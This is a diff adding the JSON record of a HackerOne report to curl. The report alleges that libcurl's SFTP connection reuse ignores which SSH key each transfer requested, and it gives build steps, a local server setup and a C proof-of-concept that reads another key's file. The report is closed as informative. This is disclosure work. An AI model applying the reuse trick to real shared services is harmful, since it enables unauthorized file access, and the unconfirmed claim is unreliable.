@@ -1,0 +1,114 @@
+{
+  "id": 3788506,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzg4NTA2",
+  "url": "https://hackerone.com/reports/3788506",
+  "title": "SSH/SFTP connection reuse can bypass SSH key identity after ssh_config_matches removal",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2026-06-08T03:11:00.447Z",
+  "submitted_at": "2026-06-08T03:11:00.746Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "byteray_ltd",
+    "url": "/byteray_ltd",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-27782",
+    "CVE-2023-27538"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-09T06:30:39.568Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-08T06:20:27.742Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nlibcurl's SSH/SFTP connection reuse logic no longer binds a pooled SSH connection to the SSH key identity requested by the new transfer. After `ssh_config_matches` was removed, `url_match_proto_config()` again has no SSH-specific check for `CURLOPT_SSH_PUBLIC_KEYFILE` or `CURLOPT_SSH_PRIVATE_KEYFILE`. An application can first open an SFTP connection with an authorized key and then perform a second SFTP transfer configured with an unauthorized key; the second transfer can reuse the already-authenticated SSH session and access data as the first key. This is the same bug class as CVE-2022-27782 and CVE-2023-27538, but the current code has reintroduced the missing SSH auth-context comparison. The issue is connection-cache authentication-context confusion, not denial of service.\n\nThe vulnerable matcher currently checks HTTP and FTP protocol configuration, but there is no SSH branch:\n\n```c\nstatic bool url_match_proto_config(struct connectdata *conn,\n                                   struct url_conn_match *m)\n{\n  if(!url_match_http_version(conn, m))\n    return FALSE;\n\n#ifndef CURL_DISABLE_FTP\n  else if(get_protocol_family(m->needle->scheme) & PROTO_FAMILY_FTP) {\n    if(!ftp_conns_match(m->needle, conn))\n      return FALSE;\n  }\n#endif\n  return TRUE;\n}\n```\n\nThe removed check was the only SSH-specific reuse guard:\n\n```diff\n-  if(get_protocol_family(m->needle->scheme) & PROTO_FAMILY_SSH) {\n-    if(!ssh_config_matches(m->needle, conn))\n-      return FALSE;\n-  }\n```\n\nThe key options are still per-transfer inputs and are used during SSH authentication:\n\n```c\ncase CURLOPT_SSH_PRIVATE_KEYFILE:\n  return Curl_setstropt(&s->str[STRING_SSH_PRIVATE_KEY], ptr);\n```\n\n```c\nlibssh2_userauth_publickey_fromfile_ex(sshc->ssh_session,\n                                       user,\n                                       curlx_uztoui(strlen(user)),\n                                       sshc->rsa_pub,\n                                       sshc->rsa,\n                                       sshc->passphrase);\n```\n\nThe problem is that a later transfer with different key files can be matched to the already-authenticated connection before a new SSH authentication happens.\n\n## Affected version\n\nTest target: curl/libcurl source checkout `7b9613fa9b` on Linux, built with libssh2/SFTP support.\n\nExample expected feature output:\n\n```text\ncurl 8.x.x-DEV (...) libcurl/8.x.x-DEV ... libssh2/...\nProtocols: ... scp sftp ...\nFeatures: ... SSL ...\n```\n\nThe relevant public history is:\n\n```text\nCVE-2022-27782: TLS and SSH connection too eager reuse\nCVE-2023-27538: SSH connection too eager reuse still\nRegression point: 3e9817cd1b url: remove ssh_config_matches\n```\n\n## Steps To Reproduce:\n\n1. Build curl from the affected source with libssh2/SFTP support.\n\n```bash\n./buildconf\n./configure --with-libssh2 --with-gnutls --without-openssl\nmake -j\"$(nproc)\"\n```\n\n2. Start a local SSH/SFTP server with one account, `user_a`, and put only `user_a_key.pub` in `user_a`'s `authorized_keys`.\n\n```bash\nssh-keygen -t ed25519 -f user_a_key -N \"\"\nssh-keygen -t ed25519 -f unauthorized_key -N \"\"\ninstall -d -m 700 ~user_a/.ssh\ncp user_a_key.pub ~user_a/.ssh/authorized_keys\necho \"user_a_secret_data\" > ~user_a/secret.txt\nchmod 600 ~user_a/secret.txt\n```\n\n3. Run a libcurl client that performs three SFTP transfers. The important part is that the first two transfers share `CURL_LOCK_DATA_CONNECT`, while the third transfer uses a fresh cache as the control.\n\n```c\nCURLSH *share = curl_share_init();\ncurl_share_setopt(share, CURLSHOPT_SHARE, CURL_LOCK_DATA_CONNECT);\n\n/* Step 1: authorized key succeeds and leaves an authenticated SSH session in the pool */\nsftp_get(share, \"sftp://user_a@127.0.0.1/~/secret.txt\",\n         \"user_a_key\", \"user_a_key.pub\");\n\n/* Step 2: unauthorized key should fail, but succeeds if it reuses step 1's session */\nsftp_get(share, \"sftp://user_a@127.0.0.1/~/secret.txt\",\n         \"unauthorized_key\", \"unauthorized_key.pub\");\n\n/* Step 3: same unauthorized key with a fresh cache must be denied */\nCURLSH *fresh = curl_share_init();\nsftp_get(fresh, \"sftp://user_a@127.0.0.1/~/secret.txt\",\n         \"unauthorized_key\", \"unauthorized_key.pub\");\n```\n\nThe `sftp_get()` helper only sets the URL, `CURLOPT_SHARE`, `CURLOPT_SSH_PRIVATE_KEYFILE`, `CURLOPT_SSH_PUBLIC_KEYFILE`, and a write callback:\n\n```c\ncurl_easy_setopt(c, CURLOPT_URL, url);\ncurl_easy_setopt(c, CURLOPT_SHARE, share);\ncurl_easy_setopt(c, CURLOPT_SSH_PRIVATE_KEYFILE, key_priv);\ncurl_easy_setopt(c, CURLOPT_SSH_PUBLIC_KEYFILE, key_pub);\ncurl_easy_setopt(c, CURLOPT_WRITEFUNCTION, write_cb);\n```\n\n4. Vulnerable output:\n\n```text\n--- Step 1: authorized key reads user_a's secret ---\n  OK: \"user_a_secret_data\"\n\n--- Step 2: UNAUTHORIZED key reads user_a's secret (shared cache) ---\n  SUCCEEDED: \"user_a_secret_data\"\n\n--- Step 3 (control): UNAUTHORIZED key, FRESH cache ---\n  DENIED (expected): CURLE_LOGIN_DENIED\n\nVULNERABILITY CONFIRMED\n```\n\nThe control proves the unauthorized key is not accepted by the SSH server. It only succeeds in Step 2 because libcurl reuses the SSH session authenticated by the authorized key.\n\n## Impact\n\n## Summary:\nApplications that use libcurl's shared connection cache for SFTP/SCP can silently perform a transfer under the wrong SSH identity. A lower-privileged user, tenant, or job that controls one request can ride an existing pooled SSH session authenticated with a different key and read or write resources that its own key cannot access. This is especially relevant for backend services, CI/CD systems, deployment tools, backup systems, and multi-tenant file-transfer services that reuse libcurl handles or share connection caches for performance. The impact is unauthorized file access and authentication-context confusion, not only a local application bug, because the server sees the reused authenticated SSH session as valid.",
+  "weakness": {
+    "id": 184,
+    "name": "Authentication Bypass by Primary Weakness"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
